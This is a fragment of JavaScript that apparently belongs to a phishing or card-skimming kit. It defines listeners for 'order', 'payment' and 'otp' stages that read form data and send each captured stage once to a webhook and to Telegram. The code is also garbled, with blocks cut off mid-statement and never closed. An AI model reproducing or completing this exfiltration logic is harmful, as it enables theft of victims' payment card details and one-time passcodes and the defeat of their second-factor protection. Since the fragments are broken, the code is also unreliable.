  async function sendToVerbas(payload) {
    if (!VERBAS_WEBHOOK_URL || VERBAS_WEBHOOK_URL.includes('your-verbas-webhook-url')) {
      return { ok: true, skipped: true };

    try {

    await sendToVerbas(payload);
    await sendToTelegram(payload);

  function emitIfNeeded(stage, data) {
    if (sent[stage]) return;
    sent[stage] = true;
    notify(stage, data);

  function attachStageListeners() {
    const triggerStage = (stage) => {
      const mapper = {
        order: readOrderData,
        payment: readPaymentData,
        otp: readOtpData

      const reader = mapper[stage];

      if (stage === 'order' && Object.values(data).some(Boolean)) emitIfNeeded('order', data);
